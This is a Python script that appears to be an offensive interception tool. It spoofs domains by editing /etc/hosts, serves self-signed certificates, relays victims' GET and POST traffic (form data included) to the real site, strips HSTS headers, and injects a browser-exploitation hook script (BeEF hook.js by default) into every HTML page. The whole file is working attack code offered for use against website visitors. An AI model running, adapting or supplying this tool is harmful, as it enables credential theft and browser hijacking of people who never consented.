#!/usr/bin/python3

from http.server import HTTPServer, BaseHTTPRequestHandler
import requests
import ssl
import socket
from urllib3.util import connection
from socketserver import BaseServer

# import dns.resolver

import os
import threading
import signal

# import sys

import shutil
import re
import argparse

# import webbrowser

# Global data structures holds varient attributes for spoofed hosts
host_list = []


def sigint_handler(*args, **kwargs):
    print("[CLEANING UP...]")
    etc_cleanup()
    print("[DELETING WORKING FILES...]")
    delete_files()
    os.kill(os.getpid(), signal.SIGTERM)


signal.signal(signal.SIGINT, sigint_handler)
signal.signal(signal.SIGTSTP, sigint_handler)


def create_host_files():
    # Create self-signed ssl certificates
    for host in host_list:
        os.mkdir(host["dir"])

        shell_command = f'''openssl req -newkey rsa:4096 -x509 -sha256 -days 3650 -noenc -out "{host["dir"]}/selfsigned.pem" -keyout  "{host["dir"]}/selfsigned.key" -subj "/CN={host["host"]}"'''
        os.system(shell_command)


def delete_files():
    for host in host_list:
        if os.path.isdir(host["dir"]):
            shutil.rmtree(host["dir"])


def etc_cleanup():
    with open("/etc/hosts", "r") as f:
        etc_hosts_list = f.read().split("\n")

    for host in host_list:
        for dns_record in etc_hosts_list[::-1]:
            if host["host"] in dns_record:
                etc_hosts_list.remove(dns_record)

    etc_hosts = "\n".join(etc_hosts_list)
    shell_command = f"""sudo sh -c 'echo -n "{etc_hosts}">/etc/hosts'"""
    os.system(shell_command)


def etc_update():
    # Update /etc/hosts file
    for host in host_list:
        shell_command = (
            f"""sudo sh -c 'echo -n "\n{spoofed_addr} {host["host"]}">>/etc/hosts'"""
        )
        os.system(shell_command)
        shell_command = f"""sudo sh -c 'echo -n "\n{spoofed_addr} www.{host["host"]}">>/etc/hosts'"""
        os.system(shell_command)


class My_Class(BaseHTTPRequestHandler):
    payload = None
    certfile = None
    keyfile = None

    def __init__(self, *args, **kwargs):
        if str(args[0]).split(",")[5].strip(" )") == "443":
            self.protocol = "https://"
        else:
            self.protocol = "http://"

        self.host = None
        self.request_respond = None
        super(My_Class, self).__init__(*args, **kwargs)

    def send_response(self, code, message=None):
        self.log_request(code)
        self.send_response_only(code, message)

    def _set_headers(self, status_code, headers):
        self.send_response(status_code)

        # headers_filter_list = ["Content-Encoding", "Transfer-Encoding", "content-length", "Connection"]
        headers_filter_list = [
            "Content-Encoding",
            "Transfer-Encoding",
            "content-length",
            "Connection",
            "Strict-Transport-Security",
        ]
        for header in headers_filter_list:
            if header in headers.keys():
                # print("[REMOVING {}:  {}]".format(header, headers[header]))
                headers.pop(header)

        for item in headers:
            # print(item, headers[item], sep=": ")
            self.send_header(item, headers[item])
        # print("-"*40)
        # self.send_header('Access-Control-Allow-Origin', '*')

        self.end_headers()
        self.html_page = None  # Reset html body from previous request

    def set_html(self, message=None):
        """This just generates an HTML document that includes `message`
        in the body. Override, or re-write this do do more interesting stuff.
        """
        # html_page = """
        # <!DOCTYPE html>
        # <html>
        #   <head>
        #   </head>
        #   <body>
        #       <h1> Hi There! </h1>
        #   </body>
        # </html>
        # """
        if message and b"<html" in message:
            self.html_page = message.replace(
                b"<head>", bytes("<head> {}".format(My_Class.payload), "utf-8")
            )  # For default payload "beef-xss" is used
        else:
            self.html_page = message

    # def handle_one_request(self, *args, **kwargs):        # This code get's triggerd per each new request
    #   My_Class.certfile = os.path.join(host_list[0]["dir"], "selfsigned.pem")
    #   My_Class.keyfile = os.path.join(host_list[0]["dir"], "selfsigned.key")
    #   super(My_Class, self).handler_class(*args, **kwargs)

    def do_GET(self):
        self.host = self.headers.get("Host")
        if "https" in self.protocol:
            for host in host_list:
                if host["host"] in self.host:
                    My_Class.certfile = os.path.join(host["dir"], "selfsigned.pem")
                    My_Class.keyfile = os.path.join(host["dir"], "selfsigned.key")
            self.server.socket.context.load_cert_chain(
                My_Class.certfile, My_Class.keyfile
            )
        # with open("log.txt") as f:
        # print()
        # Read and Compile request headers to integrate into newly sent request
        headers = str(self.headers).split("\n")
        request_headers = {}
        for par in headers:
            if par:
                couple = par.split(": ")
                request_headers.update({couple[0]: couple[1]})
        # Send request to original host

        respond = requests.get(
            self.protocol + self.host + self.path,
            headers=request_headers,
            allow_redirects=False,
        )

        self._set_headers(respond.status_code, respond.headers)
        self.set_html(respond.content)

        self.wfile.write(self.html_page)

    def do_HEAD(self):
        self.wfile.write(self.html_page.encode())
        self._set_headers()

    def do_POST(self):
        self.host = self.headers.get("Host")
        for host in host_list:
            if host["host"] in self.host:
                My_Class.certfile = os.path.join(host["dir"], "selfsigned.pem")
                My_Class.keyfile = os.path.join(host["dir"], "selfsigned.key")
        self.server.socket.context.load_cert_chain(My_Class.certfile, My_Class.keyfile)
        # Read and Compile requested post parameter to integrate into newly sent request
        content_length = int(self.headers["Content-Length"])
        request_body = self.rfile.read(content_length).decode()
        request_body = request_body.split("&")
        post_data = {}
        for par in request_body:
            if par:
                couple = par.split("=")
                post_data.update({couple[0]: couple[1]})
        # Read and Compile request headers to integrate into newly sent request
        headers = str(self.headers).split("\n")
        request_headers = {}
        for par in headers:
            if par:
                couple = par.split(": ")
                request_headers.update({couple[0]: couple[1]})
        # Send request to original host
        respond = requests.post(
            self.protocol + self.host + self.path,
            data=post_data,
            headers=request_headers,
            allow_redirects=False,
        )

        self._set_headers(respond.status_code, respond.headers)
        self.set_html(respond.content)

        self.wfile.write(self.html_page)


def run(server_class=HTTPServer, handler_class=My_Class, port=80, https=False):
    # This function overrides "requests" module native dns resolving process which
    _orig_create_connection = connection.create_connection

    def patched_create_connection(address, *args, **kwargs):
        """Wrap urllib3's create_connection to resolve the name elsewhere"""
        # resolve hostname to an ip address; use your own
        # resolver here, as otherwise the system resolver will be used.
        host, port = address
        hostname = host_ip
        # hostname = dns.resolver.query(host, 'a')[0]

        return _orig_create_connection((hostname, port), *args, **kwargs)

    connection.create_connection = patched_create_connection

    # Set initial value for certificate and private key
    My_Class.certfile = os.path.join(host_list[0]["dir"], "selfsigned.pem")
    My_Class.keyfile = os.path.join(host_list[0]["dir"], "selfsigned.key")

    server_address = ("", int(port))
    httpd = server_class(server_address, handler_class)
    if https:
        httpd.socket = ssl.wrap_socket(
            httpd.socket,
            keyfile=My_Class.keyfile,
            certfile=My_Class.certfile,
            server_side=True,
            do_handshake_on_connect=False,
        )
    httpd.serve_forever()


if __name__ == "__main__":
    # Initialize argument parser
    parser = argparse.ArgumentParser(
        description="An http proxy, which works by changing local dns records at '/etc/hosts', then creates local web server to server users rouge version of website."
    )
    parser.add_argument(
        "url",
        help="A local or external website address (This could be a domain name or ip address)",
    )
    parser.add_argument(
        "-p",
        "--payload",
        default="""<head><script src="http://127.0.0.1:3000/hook.js"></script>""",
        dest="payload",
        help="Payload to inject into victim's html page. (By default beef-xss hook is used, use empty string to desable it.)",
    )
    parser.add_argument(
        "-d",
        "--destination",
        default="127.0.0.1",
        dest="spoofed_addr",
        help="Destination or Spoofed host address to redirect users to (used for mapping to domain name, defaults to localhost)",
    )
    # parser.add_argument("-d", "--destination", default="127.0.0.1", dest="spoofed_addr", help="Destination or Spoofed host address to redirect users to (used for mapping to domain name, defaults to localhost)")
    args = parser.parse_args()
    # Get url
    compiled_regex = re.compile(
        r"""^(https?://)?((([a-zA-Z0-9\-]{1,}\.?)+(\w*[a-zA-Z]\w*))|((\d{1,3}\.){3}\d{1,3}))(\:\d{1,5})?(/([a-zA-Z0-9\%\-\.\#]*/?)*(\.\w*)?)?(\?(\&?\w*\=?\w*)*)?$"""
    )
    url_list = args.url.split(",")

    for url in url_list:
        regex_match = compiled_regex.findall(url)[0]

        # Global variable initialization
        if regex_match:
            host = regex_match[1].strip("www.")
            try:
                host_ip = socket.gethostbyname(host)
            except socket.gaierror:
                print(f"[ERROR - Resolving HostName '{host}']")
            else:
                url = regex_match[-1]
                proto = regex_match[0]
                port = regex_match[7].strip(":")
                path = regex_match[8]
                pars = regex_match[11].strip("?")

                host_working_dir = os.path.join(os.getcwd(), f".{host}")

                host_list.append(
                    {
                        "ip": host_ip,
                        "url": url,
                        "proto": proto,
                        "host": host,
                        "port": port,
                        "path": path,
                        "pars": pars,
                        "dir": host_working_dir,
                    }
                )

    spoofed_addr = args.spoofed_addr
    My_Class.payload = args.payload

    if len(host_list) == 0:
        print("[INVALID URL]")
        exit(4)
        # sys.exit(57)
        # raise SystemExit("hi")

    etc_update()
    create_host_files()

    threading.Thread(target=run, kwargs={"port": 443, "https": True}).start()
    threading.Thread(target=run).start()

    # webbrowser.get("firefox").open(host + ":" + port + path + pars)
    # webbrowser.get("firefox").open(proto + host)

"""
  For this script I generate a self-signed certificate with openssl utility:
openssl req -newkey rsa:4096 -x509 -sha256 -days 3650 -noenc -out my.crt -keyout  my.key -subj "/CN=time.ir"
"""

"""
  This is a complex regex, taking into account:
- IPv4 addresses
- Subdomains (up to multip layers)
- Domain names
- Top Level Domain Names (TLDs) - with maximum of 3 letters
- Paths and Locations (up to multiple levels)
- Url parameters with or without values (up to multiple instance)

^(https?://)?((([a-zA-Z0-9\-]{1,}\.?)+(\w*[a-zA-Z]\w*))|((\d{1,3}\.){3}\d{1,3}))(\:\d{1,5})?(/([a-zA-Z0-9\%\-\.\#]*/?)*(\.\w*)?)?(\?(\&?\w*\=?\w*)*)?$
"""
